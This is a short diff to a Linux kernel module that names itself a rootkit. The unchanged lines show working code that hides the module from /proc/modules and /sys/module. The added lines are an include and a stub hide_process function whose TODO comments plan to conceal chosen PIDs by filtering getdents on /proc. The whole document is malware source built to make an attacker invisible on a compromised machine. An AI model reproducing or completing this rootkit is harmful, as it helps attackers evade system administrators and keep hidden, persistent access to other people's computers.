@@ -1,5 +1,6 @@
 #include "inc/utils.h"
 
+#include "inc/constants.h"
 #include "inc/macro_utils.h"
 #include <linux/cred.h>
 #include <linux/export.h>
@@ -37,4 +38,14 @@ void hide_module(void)
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
     pr_info("[ROOTKIT] Module was hidden from /proc/modules and /sys/module/\n");
+}
+
+int hide_process(const pid_t i32_pid, const int i32_sig)
+{
+    // TODO
+    // Create a global list of hidden PIDs
+    // Add the given PID to the list
+    // When a call to getdent is made, check if the dir is /proc (hide the PID), or
+    // or if the dir is /proc/PID or a child (return ENOENT for open, getdents, etc.)
+    return 1;
 }
